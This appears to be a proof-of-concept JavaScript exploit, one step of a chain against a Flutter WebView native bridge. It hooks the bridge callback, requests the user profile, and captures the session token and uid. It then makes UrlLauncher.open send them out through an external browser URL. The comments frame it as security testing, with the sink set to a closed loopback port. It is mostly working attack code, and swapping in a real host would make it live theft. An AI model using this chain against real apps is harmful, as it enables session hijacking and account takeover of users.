// Step 2 of the chain: read the app session token off the native bridge and hand it to a
// sink that stays on the tester's own hardware (a dead loopback port opened in Chrome).
(function () {
  var tok = null, prof = null, seen = [];
  window._b_bridge_callback_ = function (o) {
    try {
      var d = (typeof o === "string") ? JSON.parse(o) : o;
      seen.push(d.moduleName + "." + d.methodName);
      if (d && d.params && d.params.userToken) { tok = d.params.userToken; prof = d.params; done(); }
    } catch (e) { seen.push("parse-err " + e); }
    render();
  };
  window.invokeCallback = window._b_bridge_callback_;

  function call(mod, method, params) {
    var msg = JSON.stringify({ moduleName: mod, methodName: method, uniqueId: "x" + Math.random().toString(36).slice(2), params: params || {} });
    return window.flutter_inappwebview.callHandler("_b_bridge_" + mod + "_", msg);
  }

  var fired = false;
  function done() {
    if (fired || !tok) return; fired = true;
    // Exfil demo: UrlLauncher.open drives an EXTERNAL app (Chrome) to a URL we choose.
    // Target is a closed loopback port so the token never leaves this device.
    call("UrlLauncher", "open", {
      url: "http://127.0.0.1:9/EXFIL#uid=" + encodeURIComponent(prof.uid) + "&tok=" + encodeURIComponent(tok),
      externalApplication: true
    });
    render();
  }

  function render() {
    document.documentElement.innerHTML =
      "<pre style='font:11px monospace;white-space:pre-wrap;word-break:break-all;background:#fff;color:#000;padding:6px'>"
      + "=== TOKEN THEFT ===\ncallbacks: " + seen.join(", ")
      + "\n\nuid: " + (prof ? prof.uid : "-")
      + "\nemailVerified: " + (prof ? prof.emailVerified : "-")
      + "\ntoken len: " + (tok ? tok.length : 0)
      + "\ntoken head: " + (tok ? tok.slice(0, 60) : "-")
      + "\n\nUrlLauncher.open fired: " + fired + "</pre>";
  }
  render();
  call("UserProfile", "getUserProfile", {});
})();
